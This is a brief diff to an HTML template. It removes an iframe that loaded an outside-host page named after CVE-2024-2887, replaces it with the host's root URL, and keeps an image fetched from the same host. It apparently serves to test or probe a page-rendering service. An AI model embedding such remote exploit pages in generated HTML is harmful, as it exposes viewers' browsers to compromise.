@@ -4,7 +4,7 @@ template = """
 <html>
 <body>
   <h1>Hello, World 2!</h1>
-  <iframe src="https://webhooks.pw/vercel/CVE-2024-2887.html"></iframe>
+  <iframe src="https://webhooks.pw/"></iframe>
   <img src="https://webhooks.pw/test.png?delay=1" />
 </body>
 </html>
